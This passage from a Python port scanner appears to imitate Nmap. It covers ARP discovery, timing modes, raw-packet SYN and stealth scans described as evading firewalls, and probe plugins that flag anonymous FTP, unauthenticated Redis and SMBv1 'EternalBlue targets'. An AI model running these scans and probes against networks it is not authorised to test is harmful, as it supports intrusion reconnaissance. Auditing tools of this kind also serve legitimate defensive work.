        out = subprocess.check_output(
            ["arp", "-a"], stderr=subprocess.DEVNULL, timeout=5)
        pattern = (r"(\d+\.\d+\.\d+\.\d+).*?"
                   r"([\da-fA-F]{2}[:\-][\da-fA-F]{2}[:\-]"
                   r"[\da-fA-F]{2}[:\-][\da-fA-F]{2}[:\-]"
                   r"[\da-fA-F]{2}[:\-][\da-fA-F]{2})")
        for line in out.decode(errors="replace").splitlines():
            m = re.search(pattern, line)
            if m:
                results.append({
                    "ip":  m.group(1),
                    "mac": m.group(2).replace("-", ":")})
    except Exception:
        pass

    return results


def arp_scan(network: str, timeout: float = 2.0) -> List[Dict]:
    """Entry point: choose best ARP method for the current platform."""
    if IS_LINUX:
        res = _arp_scan_linux_raw(network, timeout)
        if res:
            return res
    return _arp_scan_subprocess(network)


def _get_default_iface() -> str:
    try:
        with open("/proc/net/route") as f:
            for line in f.readlines()[1:]:
                parts = line.strip().split()
                if len(parts) >= 2 and parts[1] == "00000000":
                    return parts[0]
    except Exception:
        pass
    return "eth0"


def _get_mac(iface: str) -> str:
    try:
        with open(f"/sys/class/net/{iface}/address") as f:
            return f.read().strip()
    except Exception:
        return "00:00:00:00:00:00"


# ─────────────────────────────────────────────
# Core Scanner
# ─────────────────────────────────────────────

# ═══════════════════════════════════════════════════════════════════
# [UPG-3] ADAPTIVE TIMING MODES  (-T0 to -T5, like Nmap)
# ═══════════════════════════════════════════════════════════════════
# Each timing mode configures: timeout, max_rate (pps), min_parallelism,
# inter-probe delay, and retransmit count. Higher T = faster + louder.

@dataclass
class TimingMode:
    name:            str
    timeout:         float   # per-probe socket timeout (seconds)
    max_rate:        int     # max packets/sec (0 = unlimited)
    parallelism:     int     # max concurrent threads/coroutines
    probe_delay:     float   # fixed delay between probes (seconds)
    syn_retries:     int     # SYN retransmit attempts
    icmp_probes:     int     # ICMP ping attempts


T_MODES: Dict[int, TimingMode] = {
    0: TimingMode("paranoid",    300.0,    1,   1,    5.0,   3, 5),
    1: TimingMode("sneaky",       15.0,   10,   5,    0.15,  3, 4),
    2: TimingMode("polite",        5.0,  100,  20,    0.04,  2, 3),
    3: TimingMode("normal",        2.0,    0, 100,    0.0,   2, 3),   # default
    4: TimingMode("aggressive",    1.0,    0, 250,    0.0,   1, 2),
    5: TimingMode("insane",        0.3,    0, 500,    0.0,   1, 1),
}


class AdaptiveRTT:
    """
    RFC 6298 RTT estimator.  Tracks SRTT and RTTVAR → dynamic RTO.
    Thread-safe; updated by both sync and async engines.
    """
    def __init__(self, initial_rtt: float = 0.5):
        self._srtt:   float = initial_rtt
        self._rttvar: float = initial_rtt / 2
        self._lock            = threading.Lock()

    def update(self, measured_rtt: float) -> None:
        with self._lock:
            alpha, beta  = 0.125, 0.25
            self._rttvar = ((1 - beta)  * self._rttvar
                            + beta  * abs(self._srtt - measured_rtt))
            self._srtt   = ((1 - alpha) * self._srtt
                            + alpha * measured_rtt)

    @property
    def rto(self) -> float:
        """RTO = SRTT + 4·RTTVAR, clamped 0.1–5s."""
        with self._lock:
            return max(0.1, min(5.0, self._srtt + 4 * self._rttvar))

    @property
    def srtt_ms(self) -> float:
        with self._lock:
            return round(self._srtt * 1000, 2)


class CongestionController:
    """
    [ENH-1] Adaptive congestion controller — Nmap-style dynamic pacing.

    Implements a simplified TCP-like congestion control loop:

      Phase 1 — Slow Start:
        send_rate doubles each RTT until loss is detected or
        ssthresh is reached.  Allows fast ramp-up on uncongested paths.

      Phase 2 — Congestion Avoidance:
        send_rate increases by 1 pps per RTT.  Steady, gentle growth.

      Loss event:
        ssthresh = max(send_rate / 2, MIN_RATE)
        send_rate = ssthresh  (multiplicative decrease)
        parallelism reduced by 20%

      Parallelism:
        Adjusted proportionally to send_rate; bounded by T-mode limits.

    Integrates with AsyncSynScanner and syn_batch_scan via the
    global _CONGESTION singleton, which can be read by the rate limiter.
    """

    MIN_RATE:   float = 5.0    # pps floor
    MAX_RATE:   float = 10000  # pps ceiling (practical Python limit)
    MIN_PARA:   int   = 1
    MAX_PARA:   int   = 500

    def __init__(self, initial_rate: float = 100.0,
                 initial_para: int = 50):
        self._rate:     float = initial_rate
        self._ssthresh: float = self.MAX_RATE
        self._para:     int   = initial_para
        self._slow_start: bool = True
        self._sent:     int   = 0
        self._replied:  int   = 0
        self._loss_events: int = 0
        self._lock            = threading.Lock()
        self._rtt             = AdaptiveRTT(initial_rtt=0.3)

    # ── Called when a probe is sent ──────────────────────────────────
    def on_send(self) -> None:
        with self._lock:
            self._sent += 1

    # ── Called when a reply arrives ──────────────────────────────────
    def on_reply(self, rtt: float) -> None:
        self._rtt.update(rtt)
        with self._lock:
            self._replied += 1

    # ── Called at end of each RTT window to adjust rate ──────────────
    def tick(self) -> None:
        """Call once per RTT to update send_rate and parallelism."""
        with self._lock:
            sent    = max(1, self._sent)
            replied = self._replied
            loss_ratio = 1.0 - min(1.0, replied / sent)

            # Loss event if >10% probes unanswered
            if loss_ratio > 0.10:
                self._loss_events += 1
                self._ssthresh = max(self.MIN_RATE, self._rate / 2.0)
                self._rate     = self._ssthresh
                self._slow_start = False
                # Reduce parallelism proportionally
                self._para = max(self.MIN_PARA,
                                 int(self._para * 0.8))
            elif self._slow_start:
                # Exponential growth until ssthresh
                new_rate = min(self._rate * 2.0, self._ssthresh)
                if new_rate >= self._ssthresh:
                    self._slow_start = False
                self._rate = min(new_rate, self.MAX_RATE)
            else:
                # Congestion avoidance: linear +1 pps per RTT
                self._rate = min(self._rate + 1.0, self.MAX_RATE)

            # Parallelism tracks rate on a log scale
            import math
            target_para = max(
                self.MIN_PARA,
                min(self.MAX_PARA,
                    int(math.log2(max(2, self._rate)) * 10)))
            # Smooth toward target
            self._para = int(0.8 * self._para + 0.2 * target_para)

            # Reset window counters
            self._sent    = 0
            self._replied = 0

    @property
    def send_rate(self) -> float:
        with self._lock:
            return self._rate

    @property
    def parallelism(self) -> int:
        with self._lock:
            return self._para

    @property
    def loss_events(self) -> int:
        with self._lock:
            return self._loss_events

    def install_as_rate_limiter(self) -> None:
        """Replace the global token bucket with this controller's rate."""
        global _RATE_LIMITER
        _RATE_LIMITER = TokenBucket(
            rate_pps=self._rate, capacity=int(self._rate))

    def update_rate_limiter(self) -> None:
        """Re-sync the global token bucket after a tick()."""
        global _RATE_LIMITER
        if _RATE_LIMITER is not None:
            _RATE_LIMITER = TokenBucket(
                rate_pps=self._rate, capacity=max(1, int(self._rate)))


# Global congestion controller — None until activated by -T4/-T5 or --adaptive
_CONGESTION: Optional[CongestionController] = None


# ═══════════════════════════════════════════════════════════════════
# [UPG-3] ADVANCED SCAN TYPES: NULL / FIN / XMAS / ACK / WINDOW
# ═══════════════════════════════════════════════════════════════════

# TCP flag bit constants
F_FIN  = 0x01
F_SYN  = 0x02
F_RST  = 0x04
F_PSH  = 0x08
F_ACK  = 0x10
F_URG  = 0x20
F_ECE  = 0x40
F_CWR  = 0x80


def _build_flag_packet(src_ip: str, dst_ip: str,
                       src_port: int, dst_port: int,
                       flags: int,
                       seq: int = 0, ack_num: int = 0,
                       window: int = 1024) -> bytes:
    """
    Build a raw IP+TCP packet with arbitrary TCP flags.
    Re-uses the checksum() function from the core engine.
    Used by NULL, FIN, XMAS, ACK, Window scans.
    """
    # IP header (20 bytes, no options)
    ip_id  = random.randint(0, 0xFFFF)
    ttl    = random.choice([64, 64, 64, 128])   # OS-realistic [FIX-22]
    ip_hdr = struct.pack("!BBHHHBBH4s4s",
        0x45, 0,        # version/IHL, DSCP/ECN
        40,             # total length (20 IP + 20 TCP)
        ip_id, 0x4000,  # ID, flags (DF set)
        ttl,            # TTL
        socket.IPPROTO_TCP,
        0,              # checksum placeholder
        socket.inet_aton(src_ip),
        socket.inet_aton(dst_ip),
    )
    ip_chk  = checksum(ip_hdr)
    ip_hdr  = ip_hdr[:10] + struct.pack("!H", ip_chk) + ip_hdr[12:]

    # TCP header (20 bytes, no options)
    tcp_hdr = struct.pack("!HHLLBBHHH",
        src_port, dst_port,
        seq, ack_num,
        0x50,           # data offset = 5 words (20 bytes)
        flags,
        window,
        0, 0,           # checksum placeholder, urgent pointer
    )
    # TCP pseudo-header for checksum
    pseudo  = struct.pack("!4s4sBBH",
        socket.inet_aton(src_ip),
        socket.inet_aton(dst_ip),
        0, socket.IPPROTO_TCP, len(tcp_hdr),
    )
    tcp_chk = checksum(pseudo + tcp_hdr)
    tcp_hdr = tcp_hdr[:16] + struct.pack("!H", tcp_chk) + tcp_hdr[18:]

    return ip_hdr + tcp_hdr


def _build_flag_packet_v6(src_ip6: str, dst_ip6: str,
                           src_port: int, dst_port: int,
                           flags: int,
                           seq: int = 0, ack_num: int = 0,
                           window: int = 1024) -> bytes:
    """
    [ENH-2] Build a raw TCP segment with arbitrary flags for IPv6.
    Like _build_flag_packet but IPv6: kernel prepends the IPv6 header,
    so we return only the TCP segment (no IP header).
    Checksum computed over RFC 2460 IPv6 pseudo-header.
    """
    tcp_hdr = struct.pack("!HHLLBBHHH",
        src_port, dst_port,
        seq, ack_num,
        0x50,        # data offset = 5 words (20 bytes, no options)
        flags,
        window,
        0, 0,        # checksum placeholder, urgent pointer
    )
    chk = _tcp_checksum_v6(src_ip6, dst_ip6, tcp_hdr)
    tcp_hdr = tcp_hdr[:16] + struct.pack("!H", chk) + tcp_hdr[18:]
    return tcp_hdr


def stealth_scan(ip: str, ports: List[int],
                 scan_flags: int, timeout: float) -> Dict[int, PortResult]:
    """
    [UPG-3][ENH-2] Generic stealth scan engine — IPv4 and IPv6.

    Interprets responses per RFC 793:
      NULL (0x00)       → RST=closed,       silence=open|filtered
      FIN  (0x01)       → RST=closed,       silence=open|filtered
      XMAS (0x29)       → RST=closed,       silence=open|filtered
      ACK  (0x10)       → RST=unfiltered,   silence=filtered
      Window (0x10)     → RST+nonzero_win=open, RST+zero_win=closed

    IPv6: uses AF_INET6 raw socket; kernel handles IPv6 header.
    IPv4: uses AF_INET raw socket with IP_HDRINCL.
    """
    v6 = is_ipv6(ip)
    src_ip = get_local_ip(ip)

    results: Dict[int, PortResult] = {
        p: PortResult(port=p, protocol="tcp", state="open|filtered",
                      reason="no-response")
        for p in ports
    }

    is_ack_mode    = bool(scan_flags & F_ACK and not (scan_flags & F_SYN))
    is_window_mode = (scan_flags == F_ACK)

    # ── Open raw sockets ────────────────────────────────────────────
    try:
        if v6:
            # IPv6: one SOCK_RAW for send+recv (kernel handles IP header)
            recv_sock = socket.socket(socket.AF_INET6, socket.SOCK_RAW,
                                      socket.IPPROTO_TCP)
        else:
            recv_sock = socket.socket(socket.AF_INET, socket.SOCK_RAW,
                                      socket.IPPROTO_TCP)
        recv_sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF,
                             4 * 1024 * 1024)
        recv_sock.settimeout(0.5)
    except (PermissionError, OSError):
        for r in results.values():
            r.state  = "unknown"
            r.reason = "no-root"
        return results

    port_map:  Dict[int, int] = {}   # src_port → dst_port
    allocated: List[int]      = []

    try:
        # ── Send phase ──────────────────────────────────────────────
        for dst_port in ports:
            src_port = _PORT_ALLOC.alloc()
            allocated.append(src_port)
            port_map[src_port] = dst_port
            seq = random.randint(0, 0xFFFFFFFF)

            if v6:
                pkt = _build_flag_packet_v6(src_ip, ip, src_port, dst_port,
                                             scan_flags, seq)
                send_addr = (ip, 0, 0, 0)  # (addr, port, flowinfo, scope_id)
            else:
                pkt = _build_flag_packet(src_ip, ip, src_port, dst_port,
                                          scan_flags, seq)
                send_addr = (ip, 0)

            if _RATE_LIMITER:
                _RATE_LIMITER.consume(1)
            try:
                recv_sock.sendto(pkt, send_addr)
            except OSError:
                pass

        # ── Receive phase ────────────────────────────────────────────
        deadline = time.time() + timeout

        while time.time() < deadline:
            try:
                data, addr = recv_sock.recvfrom(4096)
            except socket.timeout:
                time.sleep(0.01)
                continue
            except OSError:
                break

            # Normalise sender address for v4 vs v6
            sender_ip = addr[0]
            # Strip IPv4-mapped prefix ::ffff:x.x.x.x if present
            if sender_ip.startswith("::ffff:"):
                sender_ip = sender_ip[7:]

            if sender_ip != ip and not (v6 and sender_ip == ip):
                continue

            if v6:
                # AF_INET6 SOCK_RAW delivers the TCP segment directly
                if len(data) < 20:
                    continue
                tcp_off = 0
            else:
                if len(data) < 20 or data[9] != socket.IPPROTO_TCP:
                    continue
                tcp_off = (data[0] & 0x0F) * 4
                if len(data) < tcp_off + 20:
                    continue

            reply_dst = struct.unpack("!H", data[tcp_off + 2: tcp_off + 4])[0]
            reply_src = struct.unpack("!H", data[tcp_off:     tcp_off + 2])[0]

            if reply_dst not in port_map:
                continue
            dst_port = port_map[reply_dst]
            if reply_src != dst_port:
                continue

            flags_rx = data[tcp_off + 13]
            win_rx   = struct.unpack("!H", data[tcp_off+14: tcp_off+16])[0]
            r = results[dst_port]

            if flags_rx & F_RST:
                if is_ack_mode:
                    r.state, r.reason = "unfiltered", "rst"
                elif is_window_mode and win_rx > 0:
                    r.state, r.reason = "open",       "rst-window"
                else:
                    r.state, r.reason = "closed",     "rst"
            elif flags_rx & 0x12:  # SYN-ACK
                r.state, r.reason = "open", "syn-ack"
                ack_val = struct.unpack("!L", data[tcp_off+4:tcp_off+8])[0] + 1
                if not v6:
                    _send_rst(src_ip, ip, reply_dst, dst_port, ack_val)

    finally:
        recv_sock.close()
        for p in allocated:
            _PORT_ALLOC.free(p)

    return results


def null_scan(ip: str, ports: List[int], timeout: float) -> Dict[int, PortResult]:
    """[UPG-3] NULL scan: no TCP flags. RST=closed, silence=open|filtered."""
    return stealth_scan(ip, ports, 0x00, timeout)


def fin_scan(ip: str, ports: List[int], timeout: float) -> Dict[int, PortResult]:
    """[UPG-3] FIN scan: FIN flag only. Bypasses many stateless firewalls."""
    return stealth_scan(ip, ports, F_FIN, timeout)


def xmas_scan(ip: str, ports: List[int], timeout: float) -> Dict[int, PortResult]:
    """[UPG-3] XMAS scan: FIN+PSH+URG. Named for 'lit-up' flags."""
    return stealth_scan(ip, ports, F_FIN | F_PSH | F_URG, timeout)


def ack_scan(ip: str, ports: List[int], timeout: float) -> Dict[int, PortResult]:
    """[UPG-3] ACK scan: maps firewall rules. RST=unfiltered, silence=filtered."""
    return stealth_scan(ip, ports, F_ACK, timeout)


def window_scan(ip: str, ports: List[int], timeout: float) -> Dict[int, PortResult]:
    """[UPG-3] Window scan: ACK + nonzero RST window = open. OS-dependent."""
    return stealth_scan(ip, ports, F_ACK, timeout)


# ═══════════════════════════════════════════════════════════════════
# [UPG-4] ASYNC EVENT-LOOP SCAN ENGINE
# ═══════════════════════════════════════════════════════════════════
# Uses asyncio with raw sockets in non-blocking mode.
# For large port counts (>500 ports or >10 hosts), the async engine
# delivers 10–50x throughput over thread-per-port models by batching
# all sends and running a single non-blocking receive loop.

class AsyncSynScanner:
    """
    [UPG-4] Async SYN scanner.

    Architecture:
      1. A single async coroutine sends all SYN probes in rate-limited bursts.
      2. A parallel receive coroutine drains the raw socket using
         loop.run_in_executor() to avoid blocking the event loop.
      3. An AdaptiveRTT object updates dynamically as replies arrive,
         tightening the recv deadline on fast networks.
      4. Unanswered ports are retransmitted up to SYN_MAX_RETRIES times.

    This matches the Masscan/Nmap async model at the Python level.
    """

    def __init__(self, src_ip: str, timeout: float,
                 rtt: Optional[AdaptiveRTT] = None):
        self.src_ip  = src_ip
        self.timeout = timeout
        self.rtt     = rtt or AdaptiveRTT(initial_rtt=min(timeout / 2, 0.5))

    def scan(self, ip: str, ports: List[int]) -> Dict[int, PortResult]:
        """Entry point — runs the async event loop and returns results."""
        try:
            return asyncio.run(self._async_scan(ip, ports))
        except Exception:
            # Fall back to synchronous batch scan if async fails
            return syn_batch_scan(ip, ports, self.timeout)

    async def _async_scan(self, ip: str,
                          ports: List[int]) -> Dict[int, PortResult]:
        loop = asyncio.get_running_loop()

        results: Dict[int, PortResult] = {
            p: PortResult(port=p, protocol="tcp",
                          state="filtered", reason="no-response")
            for p in ports
        }

        # Open raw sockets in a thread (blocking call)
        try:
            send_sock, recv_sock = await loop.run_in_executor(
                None, self._open_sockets)
        except OSError:
            # No raw socket privilege → connect-scan fallback per port
            tasks = [
                loop.run_in_executor(None, tcp_connect_scan, ip, p, self.timeout)
                for p in ports
            ]
            scan_results = await asyncio.gather(*tasks, return_exceptions=True)
            for r in scan_results:
                if isinstance(r, PortResult):
                    results[r.port] = r
            return results

        probe_map:      Dict[int, Tuple[int, int]] = {}   # src_port→(dst,seq)
        allocated:      List[int] = []
        seen_ports:     set = set()
        send_times:     Dict[int, float] = {}   # dst_port→time sent

        try:
            # ── Async send loop ──────────────────────────────────────
            await loop.run_in_executor(
                None, self._send_all, ip, ports,
                probe_map, allocated, send_times, send_sock)

            # ── Async receive loop ───────────────────────────────────
            await loop.run_in_executor(
                None, self._recv_all, ip, recv_sock,
                probe_map, seen_ports, results, send_times)

            # ── Async retransmit loop ────────────────────────────────
            for _retry in range(SYN_MAX_RETRIES - 1):
                unanswered = [p for p in ports if p not in seen_ports]
                if not unanswered:
                    break
                await loop.run_in_executor(
                    None, self._send_all, ip, unanswered,
                    probe_map, allocated, send_times, send_sock)
                await loop.run_in_executor(
                    None, self._recv_all, ip, recv_sock,
                    probe_map, seen_ports, results, send_times)

        finally:
            send_sock.close()
            recv_sock.close()
            for p in allocated:
                _PORT_ALLOC.free(p)

        return results

    def _open_sockets(self) -> Tuple[socket.socket, socket.socket]:
        send_sock = socket.socket(socket.AF_INET, socket.SOCK_RAW,
                                  socket.IPPROTO_RAW)
        send_sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

        recv_sock = socket.socket(socket.AF_INET, socket.SOCK_RAW,
                                  socket.IPPROTO_TCP)
        recv_sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF,
                             8 * 1024 * 1024)   # 8MB — larger than sync engine
        recv_sock.settimeout(0.5)
        return send_sock, recv_sock

    def _send_all(self, ip: str, ports: List[int],
                  probe_map: Dict, allocated: List,
                  send_times: Dict, send_sock: socket.socket) -> None:
        for dst_port in ports:
            src_port = _PORT_ALLOC.alloc()
            allocated.append(src_port)
            seq_num  = random.randint(0, 0xFFFFFFFF)
            probe_map[src_port] = (dst_port, seq_num)
            send_times[dst_port] = time.time()

            pkt = _build_syn_packet(self.src_ip, ip, src_port,
                                    dst_port, seq_num)
            if _RATE_LIMITER:
                _RATE_LIMITER.consume(1)
            try:
                send_sock.sendto(pkt, (ip, 0))
                if _CONGESTION:
                    _CONGESTION.on_send()   # [ENH-1] track sent probes
            except OSError:
                pass

    def _recv_all(self, ip: str, recv_sock: socket.socket,
                  probe_map: Dict, seen_ports: set,
                  results: Dict, send_times: Dict) -> None:
        deadline    = time.time() + self.rto_deadline()
        tick_time   = time.time() + self.rtt.rto   # [ENH-1] periodic tick

        while time.time() < deadline and len(seen_ports) < len(results):
            try:
                data, addr = recv_sock.recvfrom(4096)
            except socket.timeout:
                # [ENH-1] Periodic congestion tick on each timeout window
                if _CONGESTION and time.time() >= tick_time:
                    _CONGESTION.tick()
                    _CONGESTION.update_rate_limiter()
                    tick_time = time.time() + self.rtt.rto
                time.sleep(0.005)
                continue
            except OSError:
                break

            if addr[0] != ip or len(data) < 20:
                continue
            if data[9] != socket.IPPROTO_TCP:
                continue

            ihl = (data[0] & 0x0F) * 4
            if len(data) < ihl + 20:
                continue

            reply_dst = struct.unpack("!H", data[ihl + 2: ihl + 4])[0]
            reply_src = struct.unpack("!H", data[ihl:     ihl + 2])[0]

            if reply_dst not in probe_map:
                continue
            dst_port, _ = probe_map[reply_dst]
            if reply_src != dst_port:
                continue

            # [ENH-1] Update RTT and congestion controller on each reply
            if dst_port in send_times:
                rtt = time.time() - send_times[dst_port]
                self.rtt.update(rtt)
                if _CONGESTION:
                    _CONGESTION.on_reply(rtt)

            flags      = data[ihl + 13]
            remote_seq = struct.unpack("!L", data[ihl + 4: ihl + 8])[0]
            r = results[dst_port]

            if flags & 0x12:   # SYN-ACK → open
                r.state   = "open"
                r.reason  = "syn-ack"
                r.service = service_name(dst_port)

                tcp_win = struct.unpack("!H", data[ihl+14:ihl+16])[0]
                df      = bool(struct.unpack("!H", data[6:8])[0] & 0x4000)
                has_opt = (data[ihl+12] >> 4) * 4 > 20
                r._fp_tcp_window      = tcp_win
                r._fp_df_bit          = df
                r._fp_has_tcp_options = has_opt

                _send_rst(self.src_ip, ip, reply_dst, dst_port,
                          remote_seq + 1)
            elif flags & 0x04:  # RST → closed
                r.state  = "closed"
                r.reason = "reset"

            seen_ports.add(dst_port)

        # [ENH-1] Final tick at end of receive window
        if _CONGESTION:
            _CONGESTION.tick()
            _CONGESTION.update_rate_limiter()

    def rto_deadline(self) -> float:
        """Dynamic timeout = max(configured_timeout, 2 * RTO)."""
        return max(self.timeout, 2 * self.rtt.rto)


# ═══════════════════════════════════════════════════════════════════
# [UPG-2] PLUGIN / SCRIPT ENGINE  (NSE equivalent)
# ═══════════════════════════════════════════════════════════════════

@dataclass
class PluginResult:
    plugin:  str
    port:    int
    output:  str
    data:    Dict[str, Any] = field(default_factory=dict)


@dataclass
class PluginSpec:
    """Metadata + implementation for one plugin."""
    name:     str
    ports:    List[int]    # [] = run on all open ports
    protocol: str          # "tcp" or "udp"
    run:      Callable     # fn(ip, port, timeout) → PluginResult | None


# ── Built-in Plugins ───────────────────────────────────────────────

def _plugin_http_title(ip: str, port: int, timeout: float) -> Optional[PluginResult]:
    """Fetch HTTP page title from an HTTP or HTTPS service."""
    use_ssl = port in SSL_PORTS
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((ip, port))
        if use_ssl:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode    = ssl.CERT_NONE
            sock = ctx.wrap_socket(sock, server_hostname=ip)
        sock.sendall(
            f"GET / HTTP/1.1\r\nHost: {ip}\r\nConnection: close\r\n\r\n"
            .encode())
        response = b""
        try:
            while True:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                response += chunk
                if len(response) > 65536:
                    break
        except Exception:
            pass
        sock.close()

        text = response.decode("utf-8", errors="replace")
        m = re.search(r"<title[^>]*>(.*?)</title>", text,
                      re.IGNORECASE | re.DOTALL)
        title = m.group(1).strip() if m else "(no title)"
        title = re.sub(r"\s+", " ", title)[:120]
        return PluginResult(
            plugin="http-title", port=port,
            output=f"HTTP Title: {title}",
            data={"title": title})
    except Exception:
        return None


def _plugin_ftp_anon(ip: str, port: int, timeout: float) -> Optional[PluginResult]:
    """Test whether FTP allows anonymous login."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((ip, port))
        banner = sock.recv(1024).decode("utf-8", errors="replace").strip()
        sock.sendall(b"USER anonymous\r\n")
        r1 = sock.recv(1024).decode("utf-8", errors="replace").strip()
        sock.sendall(b"PASS scanner@example.com\r\n")
        r2 = sock.recv(1024).decode("utf-8", errors="replace").strip()
        sock.close()
        if r2.startswith("2"):   # 2xx = login accepted
            return PluginResult(
                plugin="ftp-anon", port=port,
                output="FTP anonymous login ALLOWED",
                data={"anonymous": True, "response": r2})
        return PluginResult(
            plugin="ftp-anon", port=port,
            output="FTP anonymous login denied",
            data={"anonymous": False})
    except Exception:
        return None


def _plugin_redis_info(ip: str, port: int, timeout: float) -> Optional[PluginResult]:
    """Probe Redis for unauthenticated INFO command."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((ip, port))
        sock.sendall(b"INFO server\r\n")
        raw = sock.recv(4096).decode("utf-8", errors="replace")
        sock.close()
        if "redis_version" in raw:
            m = re.search(r"redis_version:([\d.]+)", raw)
            ver  = m.group(1) if m else "?"
            mode = "UNAUTHENTICATED" if "requirepass" not in raw else "protected"
            return PluginResult(
                plugin="redis-info", port=port,
                output=f"Redis {ver} ({mode})",
                data={"version": ver, "unauthenticated": "requirepass" not in raw})
        if "NOAUTH" in raw or "DENIED" in raw:
            return PluginResult(
                plugin="redis-info", port=port,
                output="Redis (auth required)",
                data={"unauthenticated": False})
    except Exception:
        pass
    return None


def _plugin_ssl_cert(ip: str, port: int, timeout: float) -> Optional[PluginResult]:
    """Extract TLS certificate subject, issuer, and expiry."""
    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode    = ssl.CERT_NONE
        with socket.create_connection((ip, port), timeout=timeout) as raw:
            with ctx.wrap_socket(raw, server_hostname=ip) as ssock:
                cert = ssock.getpeercert()
                cipher_name, proto, bits = ssock.cipher()

        if not cert:
            return PluginResult(plugin="ssl-cert", port=port,
                                output="TLS: self-signed or no cert info")

        subject = dict(x[0] for x in cert.get("subject", []))
        issuer  = dict(x[0] for x in cert.get("issuer", []))
        cn      = subject.get("commonName", "?")
        org     = subject.get("organizationName", "?")
        iss_cn  = issuer.get("commonName", "?")
        expiry  = cert.get("notAfter", "?")
        sans    = [v for t, v in cert.get("subjectAltName", []) if t == "DNS"]

        out = (f"TLS {proto}/{bits}bit  CN={cn}  Org={org}\n"
               f"        Issuer={iss_cn}  Expires={expiry}")
        if sans:
            out += f"\n        SANs: {', '.join(sans[:6])}"
        return PluginResult(
            plugin="ssl-cert", port=port, output=out,
            data={"cn": cn, "issuer": iss_cn, "expiry": expiry,
                  "sans": sans, "proto": proto, "bits": bits})
    except Exception:
        return None


def _plugin_smb_os(ip: str, port: int, timeout: float) -> Optional[PluginResult]:
    """Send SMB negotiation to extract OS and domain information."""
    # SMBv1 Negotiate Protocol Request
    smb_neg = (
        b"\x00\x00\x00\x85"                    # NetBIOS session
        b"\xff\x53\x4d\x42"                    # SMB header magic
        b"\x72"                                 # Command: Negotiate
        b"\x00\x00\x00\x00"                    # NT Status
        b"\x18\x53\xc8\x00"                    # Flags
        b"\x00\x00\x00\x00\x00\x00\x00\x00"
        b"\x00\x00\x00\x00\x00\x00\xff\xfe"
        b"\x00\x00\x00\x00"
        b"\x00\x62\x00\x02NT LM 0.12\x00"
        b"\x02SMB 2.002\x00\x02SMB 2.???\x00"
    )
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((ip, port))
        sock.sendall(smb_neg)
        raw = sock.recv(4096)
        sock.close()
        if len(raw) > 4 and raw[4:8] == b"\xffSMB":
            # Parse basic fields from response
            return PluginResult(
                plugin="smb-os", port=port,
                output="SMBv1 responded (potential EternalBlue target)",
                data={"smb_version": "v1", "warning": "SMBv1 enabled"})
        if b"\xfeSMB" in raw:
            return PluginResult(
                plugin="smb-os", port=port,
                output="SMBv2/v3 responded",
                data={"smb_version": "v2+"})
    except Exception:
        pass
    return None


def _plugin_ssh_auth(ip: str, port: int, timeout: float) -> Optional[PluginResult]:
    """Extract SSH server banner and supported auth methods."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((ip, port))
        banner = sock.recv(256).decode("utf-8", errors="replace").strip()
        # Send our client banner
        sock.sendall(b"SSH-2.0-PyScanner_7.0\r\n")
        # Read key exchange init (don't parse deeply, just grab what we can)
        kex_raw = b""
        try:
            kex_raw = sock.recv(1024)
        except Exception:
            pass
        sock.close()
        m = re.search(r"SSH-[\d.]+-(.+)", banner)
        software = m.group(1) if m else "SSH"
        return PluginResult(
            plugin="ssh-auth", port=port,
            output=f"SSH banner: {software}",
            data={"banner": banner, "software": software})
    except Exception:
        return None


def _plugin_http_server(ip: str, port: int, timeout: float) -> Optional[PluginResult]:
    """Extract Server header from HTTP/HTTPS response."""
    use_ssl = port in SSL_PORTS
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((ip, port))
        if use_ssl:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode    = ssl.CERT_NONE
            sock = ctx.wrap_socket(sock, server_hostname=ip)
        sock.sendall(b"HEAD / HTTP/1.0\r\n\r\n")
        raw = sock.recv(2048).decode("utf-8", errors="replace")
        sock.close()
        m = re.search(r"^Server:\s*(.+)$", raw, re.MULTILINE | re.IGNORECASE)
        if m:
            server = m.group(1).strip()
            return PluginResult(
                plugin="http-server", port=port,
                output=f"Server: {server}",
                data={"server": server})
    except Exception:
        pass
    return None


# ── ENH-4: Vulnerability Detection Plugins ────────────────────────

def _plugin_ssl_weak_ciphers(ip: str, port: int,
                              timeout: float) -> Optional[PluginResult]:
    """Check for weak TLS versions and cipher suites."""
    findings: List[str] = []
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode    = ssl.CERT_NONE

    # Test SSLv3 / TLS 1.0 / 1.1 (deprecated, should fail on modern stacks)
    WEAK_PROTOCOLS = [
        ("TLS 1.0", ssl.TLSVersion.TLSv1   if hasattr(ssl, 'TLSVersion') else None),
        ("TLS 1.1", ssl.TLSVersion.TLSv1_1 if hasattr(ssl, 'TLSVersion') else None),
    ]
    for proto_name, proto_ver in WEAK_PROTOCOLS:
        if proto_ver is None:
            continue
        try:
            ctx2 = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
            ctx2.check_hostname = False
            ctx2.verify_mode    = ssl.CERT_NONE
            ctx2.maximum_version = proto_ver
            ctx2.minimum_version = proto_ver
            with socket.create_connection((ip, port), timeout=timeout) as s:
                with ctx2.wrap_socket(s, server_hostname=ip):
                    findings.append(f"WEAK: {proto_name} accepted")
        except ssl.SSLError:
            pass   # Server correctly rejected weak protocol
        except Exception:
            pass

    # Check for self-signed cert
    try:
        with socket.create_connection((ip, port), timeout=timeout) as s:
            ctx3 = ssl.create_default_context()
            ctx3.check_hostname = False
            ctx3.verify_mode    = ssl.CERT_NONE
            with ctx3.wrap_socket(s, server_hostname=ip) as ssock:
